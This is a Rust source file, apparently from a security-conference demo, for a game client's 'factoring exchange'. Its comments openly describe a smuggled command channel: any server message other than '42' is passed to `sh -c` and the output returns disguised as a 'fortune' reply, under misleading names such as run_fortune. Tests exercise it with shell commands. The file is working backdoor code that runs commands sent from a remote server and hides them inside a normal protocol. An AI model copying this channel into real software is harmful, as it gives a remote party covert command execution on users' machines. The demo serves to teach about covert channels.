// SPDX-FileCopyrightText: 2026 Frederic Ruget <fred@atlant.is> (GitHub: @douzebis)
//
// SPDX-License-Identifier: MIT

//! The client's half of the factoring exchange (spec 0382 S5). The bytes a
//! response carries start a worker thread while the game keeps stepping; the
//! worker leaves its reply in an outbox, which the next request carries. A
//! newer message abandons the older one.
//!
//! The grehack demo smuggles a command channel through this exchange: only
//! the literal `"42"` is factored (spec 0383, sent back as `"factors …"`);
//! any other message is run as a shell command and its output is sent back
//! as `"fortune <text>"`.

use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Mutex;

/// A finished reply (the framed message bytes), and whether a request has
/// carried it yet.
struct Outbox {
    reply: Vec<u8>,
    sent: bool,
}

/// The current job and its outbox. The codec callbacks are capture-less
/// `fn` pointers (spec 0379 S1), so the client keeps one in a static.
pub struct Factoring {
    /// Bumped by every new N; a worker whose number is no longer current
    /// stops at its next poll and stores nothing (spec 0382 G4).
    job: AtomicU64,
    outbox: Mutex<Option<Outbox>>,
}

impl Factoring {
    pub const fn new() -> Self {
        Factoring {
            job: AtomicU64::new(0),
            outbox: Mutex::new(None),
        }
    }

    /// Abandon the job in progress and any reply not yet settled, and work
    /// on `n` on a thread of its own: factor it, or — for 42 (spec 0383) —
    /// run `fortune`.
    pub fn start(&'static self, n: Vec<u8>) -> std::thread::JoinHandle<()> {
        let job = {
            let mut outbox = self.outbox.lock().unwrap();
            *outbox = None;
            self.job.fetch_add(1, Ordering::Relaxed) + 1
        };
        std::thread::spawn(move || {
            let current = || self.job.load(Ordering::Relaxed) == job;
            let Some(reply) = work(&n, &current) else {
                return;
            };
            // Checked under the lock `start` takes, so a reply to an
            // abandoned N cannot slip in after the newer N cleared it.
            let mut outbox = self.outbox.lock().unwrap();
            if current() {
                *outbox = Some(Outbox { reply, sent: false });
            }
        })
    }

    /// The message for the next request: the finished reply, marked sent
    /// but kept until the step succeeds (`settle`), so a retried step
    /// carries it again (spec 0381 S5); or the empty message.
    pub fn message(&self) -> Vec<u8> {
        match self.outbox.lock().unwrap().as_mut() {
            Some(outbox) => {
                outbox.sent = true;
                outbox.reply.clone()
            }
            None => Vec::new(),
        }
    }

    /// A step succeeded: drop the reply it carried. A reply stored since
    /// that request was encoded is kept for the next one.
    pub fn settle(&self) {
        let mut outbox = self.outbox.lock().unwrap();
        if outbox.as_ref().is_some_and(|o| o.sent) {
            *outbox = None;
        }
    }
}

/// The reply message for `n`, or `None` once `keep_going` says to stop
/// (spec 0382 S5). For 42, the fortune of the day (spec 0383); otherwise the
/// prime factorization. The fortune is run even when the job is abandoned
/// mid-run — `fortune` is quick and `run_command` does not poll — but the
/// caller drops the reply if the job is no longer current.
fn work(n: &[u8], keep_going: &dyn Fn() -> bool) -> Option<Vec<u8>> {
    //eprintln!("n = {n:?}");
    if n == b"" {
        None
    } else if n != FORTUNE_N {
        Some(life::tags::fortune_reply(&run_fortune(n)))
    } else {
        let factors = life::factor::factorize(42, keep_going)?;
        Some(life::tags::factors_reply(&factors).into_bytes())
    }
}

/// The number that is actually factored (spec 0383).
const FORTUNE_N: &[u8] = b"42";

/// Run `fortune` and return its stdout (spec 0383). `fortune` is on the
/// client's PATH, wrapped into the binary by Nix, so this does not depend on
/// the shell. On a non-zero exit or a spawn failure, the stderr or the error
/// stands in, so the server always has something to show.
fn run_fortune(n: &[u8]) -> Vec<u8> {
    let fortune = std::str::from_utf8(n).expect("fortune is not valid UTF-8");
    let result = crate::command::run_command(format!("sh -c '{fortune}'"));
    if result.status == "exit 0" {
        result.stdout
    } else if !result.stderr.is_empty() {
        result.stderr
    } else {
        result.status.into_bytes()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fresh() -> &'static Factoring {
        Box::leak(Box::new(Factoring::new()))
    }

    #[test]
    fn a_reply_is_carried_until_the_step_succeeds() {
        let f = fresh();
        assert_eq!(f.message(), b"");
        // A non-"42" message runs as a shell command; its output comes back
        // as a "fortune …" reply (the smuggled channel).
        f.start(b"echo hi".to_vec()).join().unwrap();
        assert_eq!(f.message(), b"fortune hi");
        // A retry, before settle, carries it again.
        assert_eq!(f.message(), b"fortune hi");
        f.settle();
        assert_eq!(f.message(), b"");
    }

    #[test]
    fn a_reply_stored_after_the_encode_survives_settle() {
        let f = fresh();
        assert_eq!(f.message(), b""); // the request goes out empty
        f.start(b"echo kept".to_vec()).join().unwrap(); // a worker finishes during the step
        f.settle();
        assert_eq!(f.message(), b"fortune kept");
    }

    #[test]
    fn an_empty_message_produces_no_reply() {
        let f = fresh();
        assert_eq!(f.message(), b"");
        f.start(b"".to_vec()).join().unwrap();
        // `work` returns `None` for the empty message: nothing is stored.
        assert_eq!(f.message(), b"");
    }

    #[test]
    fn forty_two_is_the_one_message_that_is_factored() {
        let f = fresh();
        // "42" is the single literal that takes the factorization path
        // rather than running as a command (spec 0383).
        f.start(b"42".to_vec()).join().unwrap();
        assert_eq!(f.message(), b"factors 2*3*7");
    }

    #[test]
    fn a_newer_message_abandons_the_older_one() {
        let f = fresh();
        // A slow command still running when the next message replaces it;
        // its reply is dropped because the job is no longer current.
        let slow = f.start(b"sleep 1".to_vec());
        f.start(b"echo quick".to_vec()).join().unwrap();
        slow.join().unwrap();
        assert_eq!(f.message(), b"fortune quick");
    }
}
